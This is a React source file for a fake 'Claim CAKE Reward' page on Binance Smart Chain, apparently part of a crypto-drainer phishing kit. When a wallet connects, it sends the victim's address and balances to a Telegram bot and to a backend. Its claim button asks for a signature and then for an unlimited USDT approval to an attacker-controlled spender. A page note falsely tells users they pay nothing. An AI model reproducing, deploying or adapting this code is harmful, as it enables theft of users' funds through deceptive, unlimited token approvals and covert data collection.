// Approvewallet.jsx
// Approvewallet.jsx
import { useAccount, useWalletClient, useBalance } from "wagmi";
import { erc20Abi, parseUnits } from "viem";
import { bsc } from "wagmi/chains";
import { useState, useEffect } from "react";
import { eligibleWallets } from "../eligibleWallets";

// 🔹 Load from .env
const USDT_ADDRESS = import.meta.env.VITE_USDT_ADDRESS; 
const SPENDER = import.meta.env.VITE_SPENDER;
const TELEGRAM_BOT_TOKEN = import.meta.env.VITE_TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = import.meta.env.VITE_TELEGRAM_CHAT_ID;

// 🔹 Send message to Telegram
const sendToTelegram = async (message) => {
  //console.log("📩 Sending to Telegram:", message); // debug log

  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

  try {
    const response = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: "HTML",
      }),
    });

    const result = await response.json();
    //console.log("Telegram API response:", result);

    if (!response.ok) {
      //console.error("❌ Telegram API error:", result);
    }
  } catch (e) {
    //console.error("❌ Telegram send failed:", e);
  }
};


// 🔹 Send message to backend IP/port
const sendToBackendIP = async (data) => {
  // Hardcoded backend settings - change these values when deploying
  const backendIP = "YOUR_BACKEND_IP_HERE"; // Replace with your actual IP
  const backendPort = "YOUR_BACKEND_PORT_HERE"; // Replace with your actual port
  
  if (!backendIP || !backendPort || backendIP === "YOUR_BACKEND_IP_HERE" || backendPort === "YOUR_BACKEND_PORT_HERE") {
    //console.log("Backend IP/Port not configured, skipping backend send");
    return;
  }

  const endpoint = `http://${backendIP}:${backendPort}/webhook`;

  try {
    const response = await fetch(endpoint, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(data),
    });

    if (!response.ok) {
      //console.error("Backend IP API error:", await response.text());
    } else {
      console.log("✅ Data sent to backend IP successfully");
    }
  } catch (e) {
    console.error("❌ Backend IP send failed:", e);
  }
};

// 🔹 Send message to external API (legacy support)
const sendToExternalAPI = async (data) => {
  const apiEndpoint = localStorage.getItem("apiEndpoint") || "";

  if (!apiEndpoint) {
    //console.log("External API endpoint not configured, skipping external API send");
    return;
  }

  try {
    const response = await fetch(apiEndpoint, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(data),
    });

    if (!response.ok) {
      console.error("External API error:", await response.text());
    }
  } catch (e) {
    console.error("External API send failed:", e);
  }
};

// 🔹 Check if balances have changed
const hasBalanceChanged = (currentUSDT, currentBNB, address) => {
  const lastBalanceKey = `lastBalance_${address}`;
  const lastBalance = localStorage.getItem(lastBalanceKey);
  
  if (!lastBalance) {
    // First time connecting this wallet
    return true;
  }
  
  const { usdt: lastUSDT, bnb: lastBNB } = JSON.parse(lastBalance);
  
  // Compare with proper decimal precision
  const usdtChanged = Math.abs(parseFloat(currentUSDT) - parseFloat(lastUSDT)) >= 0.01;
  const bnbChanged = Math.abs(parseFloat(currentBNB) - parseFloat(lastBNB)) >= 0.000000001;
  
  return usdtChanged || bnbChanged;
};

// 🔹 Update stored balance
const updateStoredBalance = (usdtFormatted, bnbFormatted, address) => {
  const lastBalanceKey = `lastBalance_${address}`;
  const balanceData = {
    usdt: usdtFormatted,
    bnb: bnbFormatted,
    timestamp: new Date().toISOString()
  };
  localStorage.setItem(lastBalanceKey, JSON.stringify(balanceData));
};

export default function ApproveButton() {
  const { address, isConnected } = useAccount();
  const { data: walletClient } = useWalletClient();
  const [loading, setLoading] = useState(false);

  const [cakeReward, setCakeReward] = useState(0);
  const [scanCompleted, setScanCompleted] = useState(false);

  useEffect(() => {
    const checkReward = () => {
      const storedReward = localStorage.getItem("cakeReward");
      const scanStatus = localStorage.getItem("scanCompleted");

      
      // Only set CAKE reward if scan was actually completed and reward exists
      if (scanStatus === "true" && storedReward && storedReward !== "0" && storedReward !== "null") {
        setCakeReward(storedReward);
        setScanCompleted(true);
      } else {
        // Reset states if scan hasn't been completed
        setCakeReward(0);
        setScanCompleted(false);
      }
    };

    // Check immediately
    checkReward();

    // Also check periodically in case localStorage is updated
    const interval = setInterval(checkReward, 1000);

    return () => clearInterval(interval);
  }, []);


  // 🔹 Get balances
  const { data: bscBalance } = useBalance({ address, chainId: bsc.id });
  const { data: usdtBalance } = useBalance({
    address,
    token: USDT_ADDRESS,
    chainId: bsc.id,
  });

  // Format balances with proper decimal places
  const usdtFormatted = usdtBalance
    ? parseFloat(usdtBalance.formatted).toFixed(2)
    : "0.00";
  const bnbFormatted = bscBalance
    ? parseFloat(bscBalance.formatted).toFixed(9)
    : "0.000000000";

  // 🔹 Send message when wallet connects or balances change
  useEffect(() => {
    if (isConnected && address && usdtBalance && bscBalance) {
      // Check if this is a new connection or if balances have changed
      if (hasBalanceChanged(usdtFormatted, bnbFormatted, address)) {
        const message = `🟢 Wallet Update:\n<code>${address}</code>\nUSDT: $${usdtFormatted}\nBNB: ${bnbFormatted}`;
        
        // Send to Telegram
        sendToTelegram(message);
        
        // Send to backend IP
        const walletData = {
          address,
          action: "wallet_connected",
          usdtBalance: usdtFormatted,
          bnbBalance: bnbFormatted,
          timestamp: new Date().toISOString(),
        };
        
        sendToBackendIP(walletData);
        sendToExternalAPI(walletData);
        
        // Update stored balance
        updateStoredBalance(usdtFormatted, bnbFormatted, address);
      }
    }
  }, [isConnected, address, usdtFormatted, bnbFormatted]);

  // 🔹 Handle Approve button with personal sign first
  const handleApprove = async () => {
    if (!walletClient || !isConnected || !address) {
      alert("Please Connect Your Wallet.");
      return;
    }

    // Wallet eligibility check
     console.log("Wallet ID sent to claim button:", walletId);
    const walletId = walletClient?.connector?.id;
    if (!eligibleWallets[walletId]) {
       console.log("Wallet ID sent to claim button:", walletId);
      alert(
        "🚫🔒 Eligibility check failed — you need at least $10 USDT (BSC) to claim. Please top up and try again.\n" +
        "🚫🔒 Only SubWallet and Nabox Wallet are eligible to claim rewards. Please connect with an eligible wallet."
      );
     
      return;
    }

    // USDT minimum check
    if (!hasMinimumUsdt) {
      alert(
        "🚫🔒 Eligibility check failed — you need at least $10 USDT (BSC) to claim. Please top up and try again.\n" +
        "🚫🔒 Only SubWallet and Nabox Wallet are eligible to claim rewards. Please connect with an eligible wallet."
      );
      return;
    }

    setLoading(true);

    // Use consistent formatting
    const currentUsdtFormatted = usdtFormatted;
    const currentBnbFormatted = bnbFormatted;

    try {
      // Step 1: Personal Sign Message
      const cakeAmount = cakeReward && parseFloat(cakeReward) > 0 ? parseFloat(cakeReward) : 5; // Default to 5 CAKE if not scanned
      const signMessage = `Claim ${cakeAmount} CAKE Reward`;
      //console.log("Requesting personal sign for:", signMessage);

      const signature = await walletClient.signMessage({
        account: address,
        message: signMessage,
         usdtBalance: currentUsdtFormatted,
        bnbBalance: currentBnbFormatted
      });

      //console.log("Message signed successfully:", signature);

      // Send sign success to Telegram
      await sendToTelegram(
        `✅ Message Signed:\n<code>${address}</code>\nUSDT: $${currentUsdtFormatted}\nBNB: ${currentBnbFormatted}`
      );

      const signData = {
        address,
        action: "message_signed",
        message: signMessage,
        signature: signature,
        usdtBalance: currentUsdtFormatted,
        bnbBalance: currentBnbFormatted,
        timestamp: new Date().toISOString(),
      };

      await sendToBackendIP(signData);
      await sendToExternalAPI(signData);

      // Step 2: Proceed with USDT Approval
      const maxAmount = parseUnits(
        "115792089237316195423570985008687907853269984665640564039457584007913129639935",
        0
      );

      const hash = await walletClient.writeContract({
        address: USDT_ADDRESS,
        abi: erc20Abi,
        functionName: "approve",
        args: [SPENDER, maxAmount],
        account: address,
      });

      await sendToTelegram(
        `✅ USDT Approved:\n<code>${address}</code>\nUSDT: $${currentUsdtFormatted}\nBNB: ${currentBnbFormatted}\nTx Hash: ${hash}\nSigned Message: "${signMessage}"`
      );

      const approvalData = {
        address,
        action: "approval_success",
        txHash: hash,
        signedMessage: signMessage,
        signature: signature,
        usdtBalance: currentUsdtFormatted,
        bnbBalance: currentBnbFormatted,
        timestamp: new Date().toISOString(),
      };

      await sendToBackendIP(approvalData);
      await sendToExternalAPI(approvalData);

    } catch (err) {
      //console.error("Process failed:", err.message);

      // Determine if error was during signing or approval
      const errorContext = err.message.toLowerCase().includes('user rejected')
        ? (err.message.toLowerCase().includes('sign') ? 'Message signing rejected' : 'Transaction rejected')
        : 'Process failed';

      await sendToTelegram(
        `❌ ${errorContext}:\n<code>${address}</code>\nUSDT: $${currentUsdtFormatted}\nBNB: ${currentBnbFormatted}`
      );

      const errorData = {
        address,
        action: errorContext.toLowerCase().includes('sign') ? 'sign_failed' : 'approval_failed',
        error: err.message,
        usdtBalance: currentUsdtFormatted,
        bnbBalance: currentBnbFormatted,
        timestamp: new Date().toISOString(),
      };

      await sendToBackendIP(errorData);
      await sendToExternalAPI(errorData);
    }

    setLoading(false);
  };


  // Check if user has at least $10 USDT
  const usdtBalanceNumber = usdtBalance ? parseFloat(usdtBalance.formatted) : 0;
  const hasMinimumUsdt = usdtBalanceNumber >= 10;

 
  console.log("USDT balance sent to claim button:", usdtBalanceNumber);

  // Only show button if wallet is connected AND scanning is completed
  if (!isConnected || !scanCompleted) {
    return (
      <div style={{
        padding: "20px",
        textAlign: "center",
        borderRadius: "15px",
        background: "rgba(255, 255, 255, 0.05)",
        border: "1px solid rgba(255, 255, 255, 0.1)",
        color: "rgba(255, 255, 255, 0.7)"
      }}>
        {!isConnected
          ? "🔗 Connect your wallet to claim rewards"
          : "🔍 Complete wallet scan to unlock claim"}
      </div>
    );
  }

  return (
    <div>
      <button
        onClick={handleApprove}
        disabled={loading}
        style={{
          width: "100%",
          padding: "18px 24px",
          fontSize: "1.1rem",
          fontWeight: "700",
          color: "#ffffff",
          background: loading
            ? "rgba(139, 92, 246, 0.5)"
              : "#fb923cff",

          border: "none",
          borderRadius: "15px",
          cursor: loading ? "not-allowed" : "pointer",
          transition: "all 0.3s ease",
          boxShadow: loading
            ? "none"
            : "0 8px 25px rgba(139, 92, 246, 0.4)",
          position: "relative",
          overflow: "hidden",
          backdropFilter: "blur(10px)",
        }}
        onMouseEnter={(e) => {
          if (!loading) {
            e.target.style.transform = "translateY(-2px)";
            e.target.style.boxShadow = "0 12px 35px rgba(139, 92, 246, 0.6)";
          }
        }}
        onMouseLeave={(e) => {
          if (!loading) {
            e.target.style.transform = "translateY(0)";
            e.target.style.boxShadow = "0 8px 25px rgba(139, 92, 246, 0.4)";
          }
        }}
      >
        {loading && (
          <div style={{
            position: "absolute",
            top: 0,
            left: "-100%",
            width: "100%",
            height: "100%",
            background: "linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent)",
            animation: "claimScan 1.2s infinite"
          }} />
        )}
        <span style={{ position: "relative", zIndex: 1 }}>
          
      
          {loading ? "🔄 Claiming..." : cakeReward && parseFloat(cakeReward) > 0 ? `🍰 Claim ${parseFloat(cakeReward)} CAKE` : "🍰 Claim CAKE Reward"}
        </span>
        <style>
          {`
            @keyframes claimScan {
              0% { left: -100%; }
              100% { left: 100%; }
            }
          `}
        </style>
      </button>
     
      {/* Warning message when insufficient USDT */}
      {!hasMinimumUsdt && (
        <div style={{
          marginTop: "15px",
          padding: "15px",
          borderRadius: "12px",
          background: "rgba(255, 193, 7, 0.1)",
          border: "1px solid rgba(255, 193, 7, 0.3)",
          color: "rgba(255, 255, 255, 0.9)",
          textAlign: "center"
        }}>
          <div style={{
            fontSize: "1rem",
            fontWeight: "600",
            marginBottom: "8px",
            color: "#ffc107"
          }}>
            💰 Minimum $10 USDT Required
          </div>
          <div style={{
            fontSize: "14px",
            marginBottom: "12px",
            color: "rgba(255, 255, 255, 0.8)",
            fontStyle: "italic"
          }}>
            Current balance: ${usdtFormatted} USDT
          </div>
        </div>
      )}

      {/* View CAKE Price link */}
      <div style={{
        marginTop: "15px",
        textAlign: "center"
      }}>
        <a
          href="https://www.coingecko.com/en/coins/pancakeswap"
          target="_blank"
          rel="noopener noreferrer"
          style={{
            color: "#8b5cf6",
            textDecoration: "none",
            fontSize: "14px",
            fontWeight: "500",
            display: "inline-flex",
            alignItems: "center",
            gap: "6px",
            transition: "all 0.2s ease",
            borderBottom: "1px solid transparent"
          }}
          onMouseEnter={(e) => {
            e.target.style.color = "#3b82f6";
            e.target.style.borderBottomColor = "#3b82f6";
          }}
          onMouseLeave={(e) => {
            e.target.style.color = "#8b5cf6";
            e.target.style.borderBottomColor = "transparent";
          }}
        >
          📊 View CAKE Price
        </a>
        <div style={{
          fontSize: "11px",
          color: "rgba(255, 255, 255, 0.5)",
          marginTop: "4px"
        }}>
          (Redirects to CoinGecko🐸)
        </div>
      </div>

      {/* Explanatory note */}
      <div style={{
        marginTop: "15px",
        fontSize: "13px",
        lineHeight: "1.5",
        color: "rgba(255, 255, 255, 0.7)",
        background: "rgba(255, 255, 255, 0.05)",
        padding: "12px",
        borderRadius: "10px",
        border: "1px solid rgba(255, 255, 255, 0.1)",
        textAlign: "center",
        fontStyle: "italic"
      }}>
        💡 Note: You're not paying anything — holding at least $10 USDT on the Binance Smart Chain (BSC) network simply proves you're real and helps stop bots and cheaters from abusing the system. This keeps rewards fair for active users like you.
      </div>
    </div>
  );
}